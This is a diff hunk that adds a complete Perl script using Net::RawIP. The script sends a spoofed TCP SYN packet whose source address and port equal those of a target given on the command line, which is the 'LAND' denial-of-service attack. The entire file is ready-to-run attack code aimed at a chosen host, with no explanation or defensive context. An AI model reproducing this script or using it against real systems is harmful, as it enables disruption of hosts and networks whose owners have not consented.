@@ -1,0 +1,15 @@
+#!/usr/bin/perl
+require 'getopts.pl';
+use Net::RawIP;
+Getopts('i:p:');
+$a = new Net::RawIP;
+die "Usage $0 -i <target> -p <target port>" unless ($opt_i && $opt_p);
+$a->set({ ip => {saddr => $opt_i,
+                 daddr => $opt_i
+		 },
+	  tcp=> {dest => $opt_p,
+	         source => $opt_p,
+	         psh => 1,
+	         syn => 1}
+	});				
+$a->send;
